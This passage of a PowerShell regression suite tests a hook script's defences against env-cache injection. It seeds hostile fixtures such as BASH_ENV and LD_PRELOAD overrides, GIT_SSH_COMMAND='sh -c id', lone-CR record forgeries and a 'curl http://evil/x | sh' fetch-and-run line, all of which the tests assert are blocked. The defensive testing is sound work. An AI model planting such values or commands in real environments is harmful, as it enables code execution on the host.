        # FAILS ON A CORRECT IMPLEMENTATION there, which is pitfall 2 exactly.
        # stride-hook.ps1 documents the same trap for `git ls-files` and pins the
        # encoding; a test can do better and keep the decoder out of the path.
        $d281Echo = Join-Path $d281Proj 'title.out'
        & bash -c '. "$1" > /dev/null 2>&1; printf %s "$TASK_TITLE" > "$2"' _ $d281Cache $d281Echo 2>$null | Out-Null
        if (-not (Test-Path $d281Echo)) {
            Write-Host "  FAIL: 23c5 (D281): bash wrote no readback file, so the byte comparison would prove nothing" -ForegroundColor Red
            $script:FAIL++
        } else {
            $d281EchoBytes = [System.IO.File]::ReadAllBytes($d281Echo)
            $d281WantBytes = (New-Object System.Text.UTF8Encoding($false)).GetBytes($d281Title)
            $d281Same = $d281EchoBytes.Length -eq $d281WantBytes.Length
            if ($d281Same) { for ($i = 0; $i -lt $d281WantBytes.Length; $i++) { if ($d281EchoBytes[$i] -ne $d281WantBytes[$i]) { $d281Same = $false; break } } }
            Assert-Eq "23c5 (D281): bash sources the non-ASCII title back byte-for-byte" "True" "$d281Same"
        }
    }
} else {
    Write-Host "  SKIP: 23c5: the D281 non-ASCII byte test needs bash and git" -ForegroundColor Yellow
}

# --- 23c3 (D275): the hook-env key filter is an ALLOW-list ---
# Mirrors bash cases 9j-9n. What passes this filter is exported into the
# Process environment by Set-HookEnv and written to the env cache, so a key the
# server invents used to reach both: the filter was a deny-list naming
# HOOK_NAME, the five client-owned record families and STRIDE_*, which let
# PATH, BASH_ENV and GIT_SSH_COMMAND straight through.
#
# The case-INSENSITIVE half is the one with no bash equivalent and is asserted
# here rather than assumed. Windows environment variable names are
# case-insensitive, so 'pAtH' and 'PATH' are one variable; a case-sensitive
# test would admit 'pAtH' as an unrecognised name and then have it collide with
# PATH on assignment.
if ($g23Bash -and (Get-Command git -ErrorAction SilentlyContinue)) {
    $d275Proj = New-GitRepo -Name 'd275-allow-list'
    Set-Content -Path (Join-Path $d275Proj '.stride.md') -Encoding UTF8 -Value @'
# Stride Configuration

## before_doing
```bash
```

## after_doing
```bash
```

## before_review
```bash
```

## after_review
```bash
```

## after_goal
```bash
```
'@
    $d275Claim = @{
        tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
        tool_response = @{
            stdout = (@{
                data = @{ id = 275; identifier = 'D275'; title = 'allow-list'
                          status = 'in_progress'; complexity = 'medium'; priority = 'high' }
                hook = @{ name = 'before_doing'; env = [ordered]@{
                    BOARD_NAME              = 'legit-board'
                    TASK_IDENTIFIER         = 'D275'
                    PATH                    = '/evil/bin'
                    BASH_ENV                = '/tmp/pwn.sh'
                    GIT_SSH_COMMAND         = 'sh -c id'
                    LD_PRELOAD              = '/tmp/x.so'
                    DYLD_INSERT_LIBRARIES   = '/tmp/y.dylib'
                    SHELLOPTS               = 'xtrace'
                    TASK_BASE_REF           = 'deadbeef'
                    STRIDE_FOO              = '1'
                } }
            } | ConvertTo-Json -Depth 8 -Compress)
            stderr = ''; interrupted = $false
        }
    } | ConvertTo-Json -Depth 10 -Compress
    $d275R = Invoke-HookScript -InputJson $d275Claim -Phase 'post' -ProjectDir $d275Proj
    Assert-Exit "23c3: a claim carrying process-critical hook-env keys exits 0" 0 $d275R.ExitCode
    $d275Cache = Join-Path $d275Proj '.stride-env-cache'
    $d275Body = if (Test-Path $d275Cache) { Get-Content -Raw -LiteralPath $d275Cache } else { '' }
    # NON-VACUITY GUARD FIRST. An unwritten cache contains no dangerous key
    # either, so without this the leak assertion below could pass while proving
    # nothing — which is exactly how the bash twin of this case first passed.
    Assert-Contains "23c3: the env cache was written, so the leak check is not vacuous" `
        "BOARD_NAME=" $d275Body
    $d275Bad = @('PATH', 'BASH_ENV', 'GIT_SSH_COMMAND', 'LD_PRELOAD',
                 'DYLD_INSERT_LIBRARIES', 'SHELLOPTS', 'STRIDE_FOO')
    $d275Leaked = @()
    foreach ($k in $d275Bad) {
        if ($d275Body -match "(?m)^$([regex]::Escape($k))=") { $d275Leaked += $k }
    }
    Assert-Eq "23c3: no process-critical key reaches the env cache" `
        '' ($d275Leaked -join ',')
    # TASK_BASE_REF is deliberately NOT in the list above: the claim branch
    # writes it CLIENT-side from its own git resolution (stride-hook.ps1:4169),
    # so its presence in the cache is correct and asserting the key is absent
    # would be asserting the wrong thing. The property that matters is that the
    # SERVER's forged value loses — the payload above supplies 'deadbeef'.
    Assert-Eq "23c3: a server-forged TASK_BASE_REF does not reach the env cache" `
        'False' "$($d275Body -match "(?m)^TASK_BASE_REF='deadbeef'")"
    # The case variant needs its OWN payload: a PowerShell hash literal cannot
    # hold 'PATH' and 'pAtH' at once (its keys are case-insensitive, and
    # ConvertFrom-Json rejects the pair outright too), so the collision cannot
    # be expressed in the claim above. A server can still send 'pAtH' alone,
    # and on Windows that IS PATH — which is why the filter matches
    # case-insensitively rather than by exact spelling.
    $d275Proj2 = New-GitRepo -Name 'd275-case-variant'
    Copy-Item (Join-Path $d275Proj '.stride.md') (Join-Path $d275Proj2 '.stride.md')
    $d275Claim2 = @{
        tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
        tool_response = @{
            stdout = (@{
                data = @{ id = 276; identifier = 'D275b'; title = 'case variant'
                          status = 'in_progress'; complexity = 'small'; priority = 'low' }
                hook = @{ name = 'before_doing'; env = [ordered]@{
                    BOARD_NAME = 'legit-board-2'
                    pAtH       = '/case/evil'
                    Bash_Env   = '/tmp/case-pwn.sh'
                } }
            } | ConvertTo-Json -Depth 8 -Compress)
            stderr = ''; interrupted = $false
        }
    } | ConvertTo-Json -Depth 10 -Compress
    $d275R2 = Invoke-HookScript -InputJson $d275Claim2 -Phase 'post' -ProjectDir $d275Proj2
    Assert-Exit "23c3: a claim carrying case-variant hook-env keys exits 0" 0 $d275R2.ExitCode
    $d275Cache2 = Join-Path $d275Proj2 '.stride-env-cache'
    $d275Body2 = if (Test-Path $d275Cache2) { Get-Content -Raw -LiteralPath $d275Cache2 } else { '' }
    Assert-Contains "23c3: the case-variant run wrote its cache, so the next check is not vacuous" `
        "BOARD_NAME=" $d275Body2
    $d275CaseLeak = @()
    foreach ($k in @('pAtH', 'Bash_Env')) {
        if ($d275Body2 -match "(?im)^$([regex]::Escape($k))=") { $d275CaseLeak += $k }
    }
    Assert-Eq "23c3: a case-variant PATH or BASH_ENV is blocked too" '' ($d275CaseLeak -join ',')

    # The allow-list itself must hold exactly the documented names, and must
    # agree with the bash twin. A copy of a table rots; this is what notices.
    # (?-i) is load-bearing on BOTH patterns: PowerShell regex is
    # case-INSENSITIVE by default, so a bare [A-Z_]+ also matches lowercase and
    # the doc scrape picked up duration_ms, exit_code and output from unrelated
    # tables — the guard then reported them as missing from the allow-list.
    # NESTED two-argument Join-Path, not the three-argument form. The extra
    # arguments bind -AdditionalChildPath, which is PowerShell 6+; on Windows
    # PowerShell 5.1 — the host stride-hook.sh execs, and the host this file is
    # held in scope for — that is a parameter-binding error, and under this
    # suite's $ErrorActionPreference = 'Stop' it would terminate the whole run.
    # scripts/check-ps1-compat.sh cannot catch it: that gate checks cmdlet
    # NAMES, not their parameters (README.md:397-407), and a pwsh 7 run on
    # macOS is green either way. It would have been the one part of D275 that
    # does not execute on the shipping host.
    $d275DocPath = Join-Path (Join-Path (Join-Path (Join-Path $PSScriptRoot '..') 'skills') 'stride-workflow') 'hook-execution.md'
    $d275Doc = (Select-String -Path $d275DocPath `
        -Pattern '(?-i)^\| `([A-Z_]+)` \|' -AllMatches).Matches |
        ForEach-Object { $_.Groups[1].Value } |
        Where-Object { $_ -ne 'HOOK_NAME' } | Sort-Object -Unique
    # Read the allow-list from its own declaration rather than scraping the
    # whole file for quoted uppercase words, which swept up every unrelated
    # string literal in the script.
    $d275Src = Get-Content -Raw -LiteralPath (Join-Path $PSScriptRoot 'stride-hook.ps1')
    $d275Decl = [regex]::Match($d275Src, '(?s)\$script:StrideHookEnvAllow\s*=\s*@\((.*?)\)')
    $d275Code = ([regex]::Matches($d275Decl.Groups[1].Value, "(?-i)'([A-Z_]+)'") |
        ForEach-Object { $_.Groups[1].Value } | Sort-Object -Unique)
    Assert-Eq "23c3: the ps1 allow-list declaration was found and parsed" `
        'True' "$($d275Decl.Success -and $d275Code.Count -eq 17)"
    $d275Missing = $d275Doc | Where-Object { $d275Code -notcontains $_ }
    Assert-Eq "23c3: every documented hook-env name appears in the ps1 allow-list" `
        '' (($d275Missing | Sort-Object) -join ',')
} else {
    Write-Host "  SKIP: 23c3: the D275 allow-list test needs bash and git" -ForegroundColor Yellow
}

# --- 23d: the flatten is RETAINED alongside the quoting ---
# They close different halves and the task's pitfalls require both. Quoting
# stops bash INTERPRETING a value; flattening stops it becoming a second
# physical line, which this port's line-oriented loader would read as a record
# of its own. 8l already pins Set-HookEnv's flatten; this pins the claim
# identity block, which never flattened before D280.
if (Get-Command git -ErrorAction SilentlyContinue) {
    $g23NlProj = New-GitRepo -Name 'g23-newline'
    $g23NlTitle = "Fix login`nTASK_BASE_REF_99='deadbeef'"
    $g23NlClaim = @{
        tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
        tool_response = @{
            stdout = (@{ data = @{ id = 42; identifier = 'W42'; title = $g23NlTitle
                                   status = 'in_progress'; complexity = 'medium'; priority = 'high' } } | ConvertTo-Json -Depth 8 -Compress)
            stderr = ''; interrupted = $false
        }
    } | ConvertTo-Json -Depth 10 -Compress
    $r = Invoke-HookScript -InputJson $g23NlClaim -Phase 'post' -ProjectDir $g23NlProj
    Assert-Exit "23d: a claim carrying a newline in the title exits 0" 0 $r.ExitCode
    $g23NlLines = @(Get-Content -Path (Join-Path $g23NlProj '.stride-env-cache') -Encoding UTF8)
    Assert-Eq "23d: the newline is flattened, so the title occupies ONE physical line" "1" `
        "$(@($g23NlLines | Where-Object { $_ -like 'TASK_TITLE=*' }).Count)"
    Assert-Eq "23d: and the forged record line it carried is NOT a line of its own" "0" `
        "$(@($g23NlLines | Where-Object { $_ -match '^TASK_BASE_REF_99=' }).Count)"
    Assert-Contains "23d: the flattened title keeps both halves, separated by a space" `
        "TASK_TITLE='Fix login TASK_BASE_REF_99=" "$($g23NlLines -join "`n")"
} else {
    Write-Host "  SKIP: 23d: the newline-flatten test needs git" -ForegroundColor Yellow
}

# --- 23d2: a LONE CARRIAGE RETURN, the variant the first fix missed ---
# 23d above only exercises LF, and it passed while this hole was open. Both
# flatten sites originally matched `r?`n, which REQUIRES an LF, so a bare CR
# went through untouched - and .NET's line reader honours a lone CR as a
# terminator, so the loader split one logical line into several and exported
# every fragment. Found by two independent security reviews and reproduced end
# to end: the fragment can plant BASH_ENV, which non-interactive bash sources
# before running a section, or forge another task's snapshot base.
#
# THE TEST USES [char]13 DIRECTLY, never "`r`n" - the whole point is a CR with
# no LF after it. Writing this with "`r`n" reproduces 23d and proves nothing.
if (Get-Command git -ErrorAction SilentlyContinue) {
    $g23Cr = [char]13
    foreach ($leg in @(
        @{ Name = 'identity'; Payload = 'data' },
        @{ Name = 'hookenv';  Payload = 'env'  }
    )) {
        $g23CrProj = New-GitRepo -Name "g23-cr-$($leg.Name)"
        $g23CrMarker = Join-Path $TmpDir "g23-cr-marker-$($leg.Name)"
        Remove-Item -Force $g23CrMarker -ErrorAction SilentlyContinue
        # Two forgeries in one value: a BASH_ENV that would give code execution,
        # and a base-ref record that would forge task 99's snapshot base.
        $g23CrHostile = "Fix login" + $g23Cr + "BASH_ENV=/tmp/does-not-matter" + $g23Cr + "TASK_BASE_REF_99=deadbeefcafe" + $g23Cr + "X"
        $g23CrInner = @{
            data = @{ id = 42; identifier = 'W42'; title = 'Plain title'
                      status = 'in_progress'; complexity = 'medium'; priority = 'high' }
        }
        if ($leg.Payload -eq 'data') {
            $g23CrInner.data.title = $g23CrHostile
        } else {
            $g23CrInner['hook'] = @{ name = 'before_doing'; env = @{ BOARD_NAME = $g23CrHostile } }
        }
        $g23CrClaim = @{
            tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
            tool_response = @{ stdout = ($g23CrInner | ConvertTo-Json -Depth 8 -Compress); stderr = ''; interrupted = $false }
        } | ConvertTo-Json -Depth 10 -Compress
        $r = Invoke-HookScript -InputJson $g23CrClaim -Phase 'post' -ProjectDir $g23CrProj
        Assert-Exit "23d2 [$($leg.Name)]: a claim carrying a lone CR exits 0" 0 $r.ExitCode
        $g23CrLines = @(Get-Content -Path (Join-Path $g23CrProj '.stride-env-cache') -Encoding UTF8)
        # The CR must be flattened, so NO fragment becomes a line of its own.
        Assert-Eq "23d2 [$($leg.Name)]: the CR plants no BASH_ENV line" "0" `
            "$(@($g23CrLines | Where-Object { $_ -match '^BASH_ENV=' }).Count)"
        Assert-Eq "23d2 [$($leg.Name)]: the CR forges no TASK_BASE_REF_99 record" "0" `
            "$(@($g23CrLines | Where-Object { $_ -match '^TASK_BASE_REF_99=' }).Count)"
        # And the raw bytes carry no CR at all - the writer refused it, so a
        # later rewrite cannot promote a fragment to a real line either.
        $g23CrBytes = [System.IO.File]::ReadAllBytes((Join-Path $g23CrProj '.stride-env-cache'))
        $g23CrCount = 0
        foreach ($b in $g23CrBytes) { if ($b -eq 0x0D) { $g23CrCount++ } }
        Assert-Eq "23d2 [$($leg.Name)]: no CR byte survives into the cache at all" "0" "$g23CrCount"
        Remove-Item -Force $g23CrMarker -ErrorAction SilentlyContinue
    }
} else {
    Write-Host "  SKIP: 23d2: the lone-CR test needs git" -ForegroundColor Yellow
}

# --- 23g: the loader exports ONLY the cache's own namespace (allow-list) ---
# Defence in depth behind 23d2: even if some future writer lands a forged line,
# the loader must not export a name that steers the section child's interpreter.
# Seeded directly into a cache, because the point is what the LOADER does with a
# line it is handed, independent of how that line got there.
#
# GIT_SSH_COMMAND and GIT_EXTERNAL_DIFF are in here on purpose. The first
# version of this gate was a DENY-list and it named neither, while this script
# shells out to git constantly — so they were exactly as good as BASH_ENV for an
# attacker. That is the argument for the allow-list: a deny-list has to
# enumerate every lever, and it missed two on the first try.
if (Get-Command git -ErrorAction SilentlyContinue) {
    $g23LoadProj = New-GitRepo -Name 'g23-loader-fence'
    # MUST NOT be a claim. A claim rewrites the cache BEFORE the loader reads
    # it — the unparseable branch strips BOARD_*/GOAL_*/COLUMN_*/AGENT_NAME as
    # stale window state, and the parseable branch truncates outright — so the
    # poisoned keys would be gone before the loader ever saw them and this test
    # would pass with the allow-list REMOVED. Caught by mutation; the earlier
    # 23c had the same defect. mark_reviewed routes to after_review and leaves
    # the cache alone, so the loader is the only thing under test here.
    Set-Content -Path (Join-Path $g23LoadProj '.stride.md') -Encoding UTF8 -Value @'
# Stride Configuration

## before_doing
```bash
```

## after_doing
```bash
```

## before_review
```bash
```

## after_review
```bash
echo "bashenv=[${BASH_ENV:-unset}] ldp=[${LD_PRELOAD:-unset}] gitssh=[${GIT_SSH_COMMAND:-unset}] gitdiff=[${GIT_EXTERNAL_DIFF:-unset}] home=[${STRIDE_PROBE_HOME:-unset}] base99=[${TASK_BASE_REF_99:-unset}] taskid=[${TASK_ID:-unset}] lower=[${task_id:-unset}] board=[${BOARD_NAME:-unset}] goal=[${GOAL_ID:-unset}] column=[${COLUMN_NAME:-unset}]"
```

## after_goal
```bash
```
'@
    Set-Content -Path (Join-Path $g23LoadProj '.stride-env-cache') -Encoding UTF8 -Value @(
        "TASK_ID='42'",
        "BASH_ENV='/tmp/evil'",
        "LD_PRELOAD='/tmp/evil.so'",
        "GIT_SSH_COMMAND='/tmp/evil.sh'",
        "GIT_EXTERNAL_DIFF='/tmp/evil.sh'",
        "STRIDE_PROBE_HOME='/tmp/evil'",
        "task_id='lowercase-must-not-alias'",
        "='orphan-fragment'",
        "BOARD_NAME='Legit Board'",
        "GOAL_ID='55'",
        "COLUMN_NAME='Doing'",
        "TASK_BASE_REF_99='deadbeefcafe'"
    )
    $g23LoadInput = @{
        tool_input = @{ command = 'curl -X PATCH https://stride.example.com/api/tasks/99/mark_reviewed' }
    } | ConvertTo-Json -Depth 10 -Compress
    $r = Invoke-HookScript -InputJson $g23LoadInput -Phase 'post' -ProjectDir $g23LoadProj
    Assert-Exit "23g: a mark_reviewed over a poisoned cache exits 0" 0 $r.ExitCode
    Assert-Contains "23g: the loader refuses to export BASH_ENV" "bashenv=[unset]" $r.Stdout
    Assert-Contains "23g: the loader refuses to export LD_PRELOAD" "ldp=[unset]" $r.Stdout
    Assert-Contains "23g: the loader refuses GIT_SSH_COMMAND (missed by the first deny-list)" `
        "gitssh=[unset]" $r.Stdout
    Assert-Contains "23g: the loader refuses GIT_EXTERNAL_DIFF (missed by the first deny-list)" `
        "gitdiff=[unset]" $r.Stdout
    Assert-Contains "23g: the loader refuses a STRIDE_* key, which is client-owned" `
        "home=[unset]" $r.Stdout
    # ...but the cache's own namespace MUST still load. The client-owned record
    # families in particular: each hook invocation is a fresh process, so this
    # loader is their only cross-invocation transport, and denying them would
    # collapse D226's per-task isolation into the shared base path and disable
    # the owner check. This is the half a blanket deny-list would have broken.
    Assert-Contains "23g: but a client-owned TASK_BASE_REF_<id> record still loads" `
        "base99=[deadbeefcafe]" $r.Stdout
    Assert-Contains "23g: and an ordinary identity key still loads" "taskid=[42]" $r.Stdout
    # The ADMIT half of the allow-list, which nothing else covered: the whole
    # forwarded namespace must still cross. (An earlier draft of this comment
    # claimed the leg drove an unparseable claim whose branch strips these -
    # it does not; it drives mark_reviewed, which leaves the cache alone. The
    # wrong rationale is why these three assertions were missing.)
    Assert-Contains "23g: a forwarded BOARD_* key still loads" "board=[Legit Board]" $r.Stdout
    Assert-Contains "23g: a forwarded GOAL_* key still loads" "goal=[55]" $r.Stdout
    Assert-Contains "23g: a forwarded COLUMN_* key still loads" "column=[Doing]" $r.Stdout
    # The case-sensitivity of the allow-list, asserted where it is OBSERVABLE.
    # Seeding task_id and checking TASK_ID proves nothing on this suite's host:
    # the alias only exists on Windows, so on macOS/Linux swapping the loader's
    # -cnotmatch for -notmatch left this leg fully green. bash IS
    # case-sensitive, so a lowercase key that wrongly passed the allow-list
    # would arrive as its own variable - which is directly checkable here.
    Assert-Contains "23g: a lowercase key is refused by the case-sensitive allow-list" `
        "lower=[unset]" $r.Stdout
} else {
    Write-Host "  SKIP: 23g: the loader-fence test needs git" -ForegroundColor Yellow
}

# --- 23h: a CR-bearing line authored by the BASH twin is not split on re-emit ---
# The round-2 hole, and the one the writers' own flatten cannot close: this path
# never authors the value. stride-hook.sh sq_escapes its identity values but
# does NOT flatten (a divergence the ps1 documents), so bash legitimately writes
# `TASK_TITLE='a<CR>BASH_ENV=/tmp/evil<CR>b'` as ONE physical line with the CR
# inert inside the quotes. If a ps1 pass-through re-emit reads that with
# Get-Content, .NET's line reader honours the CR, the one line becomes three,
# the filter keeps the fragments, and Write-EnvCache re-joins them with LF —
# PROMOTING `BASH_ENV=/tmp/evil` into a genuine cache line that bash then
# sources under set -a. Reading through Get-EnvCacheLine keeps it one line.
#
# Seeded as raw bytes, exactly as bash would leave it. Drives Set-HookEnv's
# re-emit, which is the pass-through with the widest reach.
if ((Get-Command git -ErrorAction SilentlyContinue) -and $g23Bash) {
    $g23ReProj = New-GitRepo -Name 'g23-reemit'
    $g23ReCache = Join-Path $g23ReProj '.stride-env-cache'
    $g23ReCr = [char]13
    [System.IO.File]::WriteAllText($g23ReCache,
        "TASK_TITLE='Fix$($g23ReCr)BASH_ENV=/tmp/evil$($g23ReCr)b'`nTASK_ID='42'`n",
        (New-Object System.Text.UTF8Encoding($false)))
    $g23ReInput = Build-AfterGoalInputFull `
        -PrimaryCommand 'curl -X PATCH https://stride.example.com/api/tasks/99/complete' `
        -Inner @{
            data  = @{ id = 99; parent_id = 55 }
            hooks = @(@{ name = 'before_review'; env = @{ BOARD_NAME = 'Board' } })
        }
    $r = Invoke-HookScript -InputJson $g23ReInput -Phase 'post' -ProjectDir $g23ReProj
    Assert-Exit "23h: a re-emit over a bash-authored CR line exits 0" 0 $r.ExitCode
    # Read the PHYSICAL lines - raw bytes, split on LF only. Get-Content is the
    # wrong reader here for the same reason it is wrong inside the hook: it
    # honours the CR and would report a BASH_ENV "line" that does not exist on
    # disk, failing this test against correct code. (It did, on the first draft.)
    $g23ReRaw = (New-Object System.Text.UTF8Encoding($false)).GetString(
        [System.IO.File]::ReadAllBytes($g23ReCache))
    $g23ReLines = @($g23ReRaw -split "`n" | Where-Object { $_ -ne '' })
    # THE assertion: the CR must not have manufactured a physical record.
    Assert-Eq "23h: the bash-authored CR does NOT become a BASH_ENV line" "0" `
        "$(@($g23ReLines | Where-Object { $_ -match '^BASH_ENV=' }).Count)"
    # And the original line survived as one record rather than three fragments.
    Assert-Eq "23h: the CR-bearing title is still exactly one line" "1" `
        "$(@($g23ReLines | Where-Object { $_ -like 'TASK_TITLE=*' }).Count)"
    # The security property, asserted through bash itself: sourcing the
    # re-emitted cache must not define BASH_ENV. Deliberately NOT a byte
    # comparison of the CR-bearing title - Out-String rewrites embedded CRs, so
    # that form fails against correct code too. This asks the question that
    # actually matters and its answer carries no CR.
    $g23ReBashEnv = (& bash -c '. "$1" > /dev/null 2>&1; printf %s "${BASH_ENV:-unset}"' _ $g23ReCache 2>$null | Out-String).TrimEnd("`r", "`n")
    Assert-Eq "23h: and bash does not get BASH_ENV defined by sourcing it" "unset" $g23ReBashEnv
} else {
    Write-Host "  SKIP: 23h: the bash-authored re-emit test needs git and bash" -ForegroundColor Yellow
}

# --- 23i: the LF route, which the flatten CANNOT close from this side ---
# The bash twin writes its identity values sq_escaped but NOT flattened, by
# design: `source` reassembles a quoted value across a newline, so bash needs no
# flatten. In a mixed checkout that means a hostile title of
# `x<LF>TASK_BASE_REF_99=deadbeefcafe<LF>y` legitimately lands as THREE physical
# lines, and the middle one is record-shaped to this port's line-oriented
# loader. No amount of flattening on the ps1 side prevents that - this path
# never authored the value. The shape gate is what closes it: a forged
# continuation is BARE (its quotes belong to the value it was cut out of),
# while every record this version writes is quoted.
if (Get-Command git -ErrorAction SilentlyContinue) {
    $g23LfProj = New-GitRepo -Name 'g23-lf-forge'
    Set-Content -Path (Join-Path $g23LfProj '.stride.md') -Encoding UTF8 -Value @'
# Stride Configuration

## before_doing
```bash
```

## after_doing
```bash
```

## before_review
```bash
```

## after_review
```bash
echo "forged=[${TASK_BASE_REF_99:-unset}] real=[${TASK_BASE_REF_77:-unset}] legacy=[${TASK_BASE_REF_88:-unset}] unproven=[${TASK_BASE_REF_UNPROVEN:-unset}] shared=[${TASK_BASE_REF:-unset}] trusted=[${TASK_BASE_REF_TRUSTED:-unset}]"
```

## after_goal
```bash
```
'@
    # Exactly what bash leaves on disk for a hostile title: the value's own
    # quotes open on line 1 and close on line 3, so the middle line is BARE.
    # The forged fragments include the four SHARED D226 control keys, not just
    # a digit-suffixed record. Those are outside the record namespace, so the
    # shape gate never covered them - they were only ever stopped by the loader
    # reading RECORDS instead of physical lines. A forged _UNPROVEN makes every
    # later run refuse its own snapshot and upload an empty diff; a forged
    # TASK_BASE_REF + _TRUSTED anchors the diff at an attacker-chosen commit.
    [System.IO.File]::WriteAllText((Join-Path $g23LfProj '.stride-env-cache'),
        "TASK_TITLE='x`nTASK_BASE_REF_99=deadbeefcafe`nTASK_BASE_REF_UNPROVEN=1`n" +
        "TASK_BASE_REF=deadbeefcafe`nTASK_BASE_REF_TRUSTED=1`ny'`n" +
        "TASK_BASE_REF_77='cafebabe1234'`n" +
        "TASK_BASE_REF_88=beefcafe5678`n",
        (New-Object System.Text.UTF8Encoding($false)))
    $g23LfInput = @{
        tool_input = @{ command = 'curl -X PATCH https://stride.example.com/api/tasks/99/mark_reviewed' }
    } | ConvertTo-Json -Depth 10 -Compress
    $r = Invoke-HookScript -InputJson $g23LfInput -Phase 'post' -ProjectDir $g23LfProj
    Assert-Exit "23i: a run over an LF-forged cache exits 0" 0 $r.ExitCode
    Assert-Contains "23i: the BARE forged record is refused by the shape gate" `
        "forged=[unset]" $r.Stdout
    Assert-Contains "23i: a genuine QUOTED record still loads" `
        "real=[cafebabe1234]" $r.Stdout
    # The documented cost of the shape gate, pinned so it is a decision rather
    # than a surprise: a pre-D280 ps1 wrote these bare, and they are refused
    # until finalize rewrites them quoted. Degrades toward absence, which the
    # base resolver treats as the conservative direction.
    Assert-Contains "23i: KNOWN COST - a legacy BARE record is refused until rewritten" `
        "legacy=[unset]" $r.Stdout
    # The shared control keys: outside the record namespace, so the shape gate
    # does not cover them. Reading records is what refuses these.
    Assert-Contains "23i: a forged TASK_BASE_REF_UNPROVEN is refused" "unproven=[unset]" $r.Stdout
    Assert-Contains "23i: a forged shared TASK_BASE_REF is refused" "shared=[unset]" $r.Stdout
    Assert-Contains "23i: a forged TASK_BASE_REF_TRUSTED is refused" "trusted=[unset]" $r.Stdout
} else {
    Write-Host "  SKIP: 23i: the LF-forge test needs git" -ForegroundColor Yellow
}

# --- 23i2: the obvious bypass of the shape gate, and why it cannot work ---
# If a forged continuation only has to LOOK quoted, the attacker just writes
# `<LF>TASK_BASE_REF_99='deadbeefcafe'<LF>` and the gate passes it. It does not
# work, and the reason is the same one that makes the record shape check a
# provable boundary rather than a probable one: to put a quote in the value the
# attacker must go through the escaper, and BOTH escapers render ' as the four
# characters '\'' — which breaks the [^']* class. So the forged line's value
# arrives as '\''deadbeefcafe'\'' and is refused.
#
# Driven through bash's REAL sq_escape, not a guess at its output, so this
# asserts against the actual reference implementation.
if ($g23Bash) {
    $g23BpSh = Join-Path $ScriptDir 'stride-hook.sh'
    $g23BpTitle = "x`nTASK_BASE_REF_99='deadbeefcafe'`ny"
    $g23BpEsc = (& bash -c '. "$1" > /dev/null 2>&1; sq_escape "$2"' _ $g23BpSh $g23BpTitle 2>$null | Out-String).TrimEnd("`r", "`n")
    # The middle physical line is the forgery attempt.
    $g23BpLines = @($g23BpEsc -split "`n")
    Assert-Eq "23i2: bash's sq_escape mangles the attacker's quotes into '\'' " "True" `
        "$($g23BpLines.Count -eq 3 -and $g23BpLines[1] -like "TASK_BASE_REF_99=*")"
    $g23BpValue = $g23BpLines[1] -replace '^[^=]+=', ''
    Assert-Eq "23i2: so the forged fragment does NOT present the strict record shape" "False" `
        "$($g23BpValue -cmatch ""^'[^']*'\z"")"
} else {
    Write-Host "  SKIP: 23i2: the shape-gate bypass probe needs bash" -ForegroundColor Yellow
}

# --- 23j: a filter must not DISMEMBER a multi-line record ---
# The round-3 hole, one layer above 23h. There the reader manufactured a record
# from a CR; here the FILTER takes a legitimately multi-line bash-authored
# record apart. Set-HookEnv drops lines whose key it is rewriting and keeps the
# rest — so given `TASK_TITLE='Fix<LF>curl evil | sh<LF>y'`, a line-oriented
# filter drops the opening line and KEEPS the interior, and Write-EnvCache
# re-joins the survivors, PROMOTING `curl evil | sh` to a top-level cache line
# that bash executes on the next `. "$ENV_CACHE"` under set -a.
#
# Both legs matter: the record must survive when kept, and vanish ENTIRELY when
# dropped. A filter that drops only the opening line is the vulnerability.
if ((Get-Command git -ErrorAction SilentlyContinue) -and $g23Bash) {
    foreach ($leg in @(
        @{ Name = 'dropped'; Env = @{ TASK_TITLE = 'Replaced' } },
        @{ Name = 'kept';    Env = @{ BOARD_NAME = 'Board' } }
    )) {
        $g23DmProj = New-GitRepo -Name "g23-dismember-$($leg.Name)"
        $g23DmCache = Join-Path $g23DmProj '.stride-env-cache'
        # Exactly what bash writes for a multi-line title: ONE sq_escaped
        # assignment spanning three physical lines, inert to its own source.
        [System.IO.File]::WriteAllText($g23DmCache,
            "TASK_TITLE='Fix`ncurl http://evil/x | sh`ny'`nTASK_ID='42'`n",
            (New-Object System.Text.UTF8Encoding($false)))
        $g23DmInput = Build-AfterGoalInputFull `
            -PrimaryCommand 'curl -X PATCH https://stride.example.com/api/tasks/99/complete' `
            -Inner @{ data = @{ id = 99; parent_id = 55 }
                      hooks = @(@{ name = 'before_review'; env = $leg.Env }) }
        $r = Invoke-HookScript -InputJson $g23DmInput -Phase 'post' -ProjectDir $g23DmProj
        Assert-Exit "23j [$($leg.Name)]: a re-emit over a multi-line record exits 0" 0 $r.ExitCode
        $g23DmRaw = (New-Object System.Text.UTF8Encoding($false)).GetString(
            [System.IO.File]::ReadAllBytes($g23DmCache))
        $g23DmLines = @($g23DmRaw -split "`n" | Where-Object { $_ -ne '' })
        # The two legs assert DIFFERENT things, and conflating them is a
        # mistake worth naming: when the record is KEPT its interior is still a
        # physical line, because that is exactly what a multi-line quoted value
        # looks like on disk. What must never happen is that interior becoming
        # a line in its own right - i.e. outside the quoting - which is only
        # observable when the record's opening line was dropped.
        if ($leg.Name -eq 'dropped') {
            Assert-Eq "23j [dropped]: the whole record goes, interior included - no promotion" "0" `
                "$(@($g23DmLines | Where-Object { $_ -eq 'curl http://evil/x | sh' }).Count)"
        } else {
            # Kept: the record must survive WHOLE. bash reading its own value
            # back is the check that it is still one quoted assignment rather
            # than three lines that happen to sit together.
            $g23DmTitle = (& bash -c '. "$1" > /dev/null 2>&1; printf %s "$TASK_TITLE"' _ $g23DmCache 2>$null | Out-String)
            Assert-Eq "23j [kept]: the multi-line record survives as ONE value" "True" `
                "$($g23DmTitle -like '*curl http://evil/x | sh*' -and $g23DmTitle -like 'Fix*')"
        }
        # Either way the interior must not be EXECUTED when bash sources it.
        # The probe is a real command substitution: if the interior were ever a
        # top-level line, this marker would appear.
        $g23DmMarker = Join-Path $TmpDir "g23-dm-marker-$($leg.Name)"
        Remove-Item -Force $g23DmMarker -ErrorAction SilentlyContinue
        [System.IO.File]::WriteAllText($g23DmCache,
            ((New-Object System.Text.UTF8Encoding($false)).GetString([System.IO.File]::ReadAllBytes($g23DmCache)) -replace
                'curl http://evil/x \| sh', ('touch ' + $g23DmMarker)),
            (New-Object System.Text.UTF8Encoding($false)))
